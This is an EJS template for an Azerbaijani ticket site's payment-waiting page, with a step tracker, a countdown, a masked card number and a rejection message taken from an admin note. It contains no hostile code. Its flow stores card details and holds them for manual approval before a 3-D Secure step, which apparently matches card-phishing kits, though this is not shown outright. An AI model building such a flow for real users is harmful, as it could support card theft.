<section class="section">
  <div class="container">
    <div style="max-width:640px;margin:0 auto">
      <div class="steps">
        <div class="step is-done"><strong>1. Kart məlumatları</strong>Qeydə alındı</div>
        <div class="step is-active"><strong>2. Təsdiq</strong>Yoxlanılır</div>
        <div class="step"><strong>3. 3-D Secure</strong>Doğrulama</div>
        <div class="step"><strong>4. Bilet</strong>Verilir</div>
      </div>

      <div class="card" id="waitBox" data-status-url="/api/payment/<%= order._id %>/status">
        <div class="card__body text-center">
          <% if (declined) { %>
            <h1 style="font-size:1.4rem"><%= t('status.rejected') %></h1>
            <div class="alert alert--error"><%= order.adminNote || t('status.rejected') %></div>
            <a href="/<%= locale %>/odenis/<%= order._id %>" class="btn btn--primary"><%= t('payment.title') %></a>
          <% } else { %>
            <div style="margin-bottom:30px">
              <svg width="120" height="120" viewBox="0 0 120 120" style="transform:rotate(-90deg)">
                <circle cx="60" cy="60" r="45" fill="none" stroke="#e0e0e0" stroke-width="3"/>
                <circle cx="60" cy="60" r="45" fill="none" stroke="#4CAF50" stroke-width="3" 
                        data-countdown-circle
                        style="stroke-dasharray: 282.74; stroke-dashoffset: 0; transition: stroke-dashoffset 0.3s linear;"/>
              </svg>
              <div style="position:relative;top:-60px;font-size:2rem;font-weight:bold;" data-countdown>2:00</div>
            </div>

            <h1 style="font-size:1.4rem"><%= t('payment.waiting') %> <span class="pulse"></span></h1>

            <p class="sec-note"><%= t('payment.saved') %> <%= t('payment.afterApproval') %></p>

            <dl class="kv" style="text-align:left;margin-top:20px">
              <dt><%= t('payment.orderLabel') %></dt><dd><%= order.orderNo %></dd>
              <dt><%= t('payment.methodCard') %></dt><dd class="mono"><%= cardMasked || '—' %></dd>
              <dt><%= t('checkout.total') %></dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
            </dl>

            <p class="sec-note mt-24"><%= t('payment.autoRefresh') %></p>
          <% } %>
        </div>
      </div>
    </div>
  </div>
</section>
